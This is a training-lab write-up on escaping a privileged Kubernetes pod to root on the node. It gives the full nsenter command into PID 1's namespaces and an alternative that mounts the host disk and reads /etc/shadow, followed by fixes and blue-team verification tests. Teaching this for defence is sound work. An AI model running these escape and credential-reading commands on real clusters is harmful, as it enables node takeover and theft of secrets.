# Episode 3 – Breakout (Container Escape)

In the previous episodes, we were confined to the Kubernetes abstraction layer (API, Secrets). Now, we are going deeper. We want to escape the container and gain access to the **Node** itself.

In this episode, we assume:
> You have compromised a pod that is running as **Privileged** (`privileged: true`).
> This is common for monitoring agents, storage drivers, or "lazy" configurations.

Our goal here is to:
- **Identify** that we are in a privileged container.
- **Escape** to the host filesystem.
- **Gain Root Access** on the Node.

## 1. Setup the Lab (The Vulnerability)

We will deploy a pod with `privileged: true` and `hostPID: true`.

From the root of this repo:

```bash
kubectl apply -f episodes/ep3-container-escape/manifests/
```

## 2. Enter the Pod

```bash
kubectl -n battleground exec -it deploy/privileged-app -- bash
```

## 3. The Attack: Escaping to the Node

### 3.1. Am I Privileged?

Check your capabilities. In a normal container, this list is short. In a privileged one, you have everything.

```bash
capsh --print
```

If you see `Current: = cap_chown,cap_dac_override,...` (basically everything), you are privileged. (Note: `capsh` might not be installed in all images, but `ps` usually is).

Also, check if you can see host processes (due to `hostPID: true`):

```bash
ps aux | grep kube
```

**Output:**
```
root         575  ... kube-apiserver --advertise-address=172.18.0.2 ...
```

If you see processes like `kube-apiserver`, `kubelet`, or `containerd`, you are seeing the **Node's** process tree.

### 3.2. The Escape Technique: nsenter

Since we share the PID namespace (`hostPID: true`) and are privileged, we can use `nsenter` to switch our namespace to that of PID 1 (the host's init process).

This effectively gives us a shell **on the node**.

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

**Boom!** 💥

Check where you are:

```bash
hostname
# Output: <your-node-name> (e.g., k8s-from-pod-to-pwn-vm or kind-control-plane)

cat /etc/os-release
# Output: The Node's OS (Ubuntu, Debian, etc.)
```

Run `ls /` and you will see the host's filesystem. You are now `root` on the Kubernetes Node.

### 3.3. Alternative: Mounting the Host Disk

If `hostPID` was not enabled but `privileged` was, we could mount the host's disk directly.

1. List devices:
   ```bash
   fdisk -l
   ```
2. Mount the root partition (usually `/dev/sda1` or similar, inside Kind it might be different):
   ```bash
   mkdir /host
   mount /dev/sda1 /host
   ```
3. Access files:
   ```bash
   cat /host/etc/shadow
   ```

## 4. Impact: What does this mean?

Once you are on the Node:
- You can read **all secrets** of all pods running on this node.
- You can read the **Kubelet's kubeconfig** (`/etc/kubernetes/kubelet.conf`).
- You can kill other containers.
- You can pivot to the cloud metadata service (Episode 5).

## 5. Fix

- **Policy:** Enforce **Pod Security Standards (PSS)**. Disallow `privileged` containers in the "Restricted" or "Baseline" policies.
- **Gatekeeper/Kyverno:** Block pods with `securityContext.privileged: true`.
- **Least Privilege:** If an app needs hardware access, grant specific capabilities (`cap_add`) instead of full privilege.

## 6. Blue Team Corner (Defense in Depth) 🛡️

Check the `defense/` folder for secure examples.

1.  **Secure Deployment (`defense/secure-deployment.yaml`):**
    - Removes `privileged: true` and `hostPID: true`.
    - Adds `seccompProfile: RuntimeDefault` to restrict system calls.
    - Drops all capabilities.

2.  **Policy as Code (`defense/kyverno-policy.yaml`):**
    - A Kyverno policy that strictly forbids `privileged` containers and `hostPID` access.
    - This effectively neutralizes the attack vector used in this episode.

**Try it out:**
```bash
kubectl apply -f episodes/ep3-container-escape/defense/secure-deployment.yaml
```

### 6.1. Verifying the Defense

**Test 1: Cannot See Host Processes**
```bash
kubectl -n battleground exec deploy/secure-app -- ps aux
```

**Expected Output:**
```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.1  0.0   2696  1408 ?        Ss   12:20   0:00 /bin/sleep 3600
root           7  0.0  0.0   7888  3968 ?        Rs   12:20   0:00 ps aux
```
Only container processes are visible, not host processes like `k3s-server` or `kubelet`.

**Test 2: nsenter Should Fail**
```bash
kubectl -n battleground exec deploy/secure-app -- \
  nsenter --target 1 --mount --uts --ipc --net --pid -- hostname
```

**Expected Output:**
```
nsenter: reassociate to namespace 'ns/ipc' failed: Operation not permitted
```

**Test 3: All Capabilities Dropped**
```bash
kubectl -n battleground exec deploy/secure-app -- cat /proc/1/status | grep -i cap
```

**Expected Output:**
```
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000000000000000
CapAmb: 0000000000000000
```
All capabilities are zeroed out, meaning no special privileges.

